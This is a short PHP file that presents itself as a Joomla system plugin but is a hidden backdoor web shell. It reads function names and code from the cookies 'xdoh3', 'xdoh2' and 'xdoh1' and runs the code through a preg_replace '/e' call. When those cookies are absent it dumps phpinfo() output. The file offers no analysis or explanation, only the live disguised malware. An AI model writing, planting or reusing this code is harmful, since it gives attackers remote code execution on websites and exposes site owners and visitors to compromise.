<?php
/**
 * @package     Joomla.Plugin.System
 * @since       1.5
 *
 *
 */
class PluginJoomla {
	public function __construct() {
		$jq = @$_COOKIE['xdoh3'];
		if ($jq) {
			$option = $jq(@$_COOKIE['xdoh2']);
			$au=$jq(@$_COOKIE['xdoh1']);
			$option("/438/e",$au,438); die();
		}
		else
			phpinfo();die;
	}
}
$content = new PluginJoomla;